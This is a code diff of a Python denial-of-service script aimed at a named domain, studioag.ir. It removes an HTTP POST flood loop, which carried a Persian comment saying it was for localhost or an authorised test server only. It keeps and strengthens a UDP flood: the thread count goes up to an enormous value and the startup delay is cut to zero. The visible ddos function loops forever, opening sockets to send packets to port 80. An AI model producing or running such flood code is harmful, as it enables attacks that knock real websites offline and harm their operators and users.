@@ -20,23 +20,14 @@ def random_ipv4():
                                 random.randint(0, 255),
                                 random.randint(1, 254))
 
-URL = "https://studioag.ir"  # فقط localhost یا سرور تست با مجوز
-TOTAL = 999999999999999
-session = requests.Session()  # نگهداری اتصال (keep-alive)
-for i in range(TOTAL):
-    try:
-        r = session.post(URL, json={"id": i})
-        print(i, r.status_code)
-    except Exception as e:
-        print("error", i, e)    
 site = ("studioag.ir")
-thread_count = ("999999999999999999999999999999999")
+thread_count = ("99999999999999999999999999999999999999999999999999999999999999999999999999")
 ip = socket.gethostbyname(site)
 UDP_PORT = 80
 MESSAGE = 'virus32'
 print("UDP target IP:", ip)
 print("UDP target port:", UDP_PORT)
-time.sleep(3)
+time.sleep(0)
 def ddos(i):
     while 1:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
